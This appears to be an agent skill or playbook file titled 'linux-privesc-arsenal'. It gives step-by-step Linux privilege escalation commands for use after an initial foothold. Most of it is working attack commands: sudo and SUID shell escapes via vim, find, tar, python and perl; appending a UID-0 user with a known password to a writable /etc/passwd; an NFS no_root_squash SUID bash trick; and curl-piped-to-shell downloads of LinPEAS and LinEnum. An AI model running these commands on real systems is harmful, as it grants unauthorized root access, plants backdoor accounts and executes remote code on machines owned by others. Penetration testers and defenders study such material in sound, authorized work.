---
name: "linux-privesc-arsenal"
description: "Complete methodology and commands for Linux local privilege escalation (Local PrivEsc) after gaining initial foothold. Covers SUID/SGID binaries (GTFOBins), sudo permissions (`sudo -l`), writable cron jobs, /etc/passwd and /etc/shadow misconfigurations, NFS no_root_squash, Linux kernel exploits, ..."
---

# Linux Privilege Escalation Playbook

## Overview
Once an unprivileged shell (e.g. `www-data`, `nobody`, `msfadmin`) is obtained on a Linux target, Local Privilege Escalation (PrivEsc) achieves full root access (UID 0).

---

## 1. Quick Wins Checklist (First 60 Seconds)

```bash
# 1. Sudo permissions without password
sudo -l

# 2. SUID binaries with GTFOBins exploitation
find / -perm -u=s -type f 2>/dev/null

# 3. Check current user, groups, and kernel
id
uname -a
cat /etc/issue

# 4. Check writable passwd / readable shadow
ls -l /etc/passwd /etc/shadow

# 5. Check cron jobs
cat /etc/crontab
ls -la /etc/cron.*
```

---

## 2. Exploiting Misconfigured Sudo (`sudo -l`)
Check GTFOBins for whatever binary is listed in `sudo -l`:

- **vim / vi:**
  `sudo vim -c ':!/bin/sh'`
- **find:**
  `sudo find . -exec /bin/sh \; -quit`
- **less / more:**
  `sudo less /etc/hosts` -> type `!/bin/sh`
- **nmap (interactive mode on older versions):**
  `sudo nmap --interactive` -> `!sh`
- **awk:**
  `sudo awk 'BEGIN {system("/bin/sh")}'`
- **tar:**
  `sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh`

---

## 3. Exploiting SUID / SGID Binaries (GTFOBins)
If any of these binaries have the SUID bit set (`-rwsr-xr-x`):

```bash
# /usr/bin/python
/usr/bin/python -c 'import os; os.execl("/bin/sh", "sh", "-p")'

# /usr/bin/perl
/usr/bin/perl -e 'exec "/bin/sh";'

# /usr/bin/find
/usr/bin/find . -exec /bin/sh -p \; -quit

# /usr/bin/env
/usr/bin/env /bin/sh -p
```

---

## 4. Exploiting Writable `/etc/passwd`
If `/etc/passwd` is writable by the current user:

```bash
# Generate root password hash with openssl
PASS_HASH=$(openssl passwd -1 -salt root password123)

# Append new root user 'toor' with UID 0
echo "toor:${PASS_HASH}:0:0:root:/root:/bin/bash" >> /etc/passwd

# Switch to the new root user
su - toor
# Password: password123 -> Root shell obtained!
```

---

## 5. Exploiting NFS `no_root_squash`
If `/etc/exports` contains `no_root_squash` on an exported share:

```bash
# From Kali machine:
mount -t nfs -o nolock <TARGET_IP>:/shared /mnt/target
cp /bin/bash /mnt/target/rootbash
chmod +s /mnt/target/rootbash
chmod 777 /mnt/target/rootbash

# Back on Target machine:
/shared/rootbash -p
# Immediate root privileges!
```

---

## 6. Automated Enumeration Scripts
Run automated recon scripts silently in memory:

```bash
# LinPEAS
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh

# LinEnum
curl -sL https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash
```
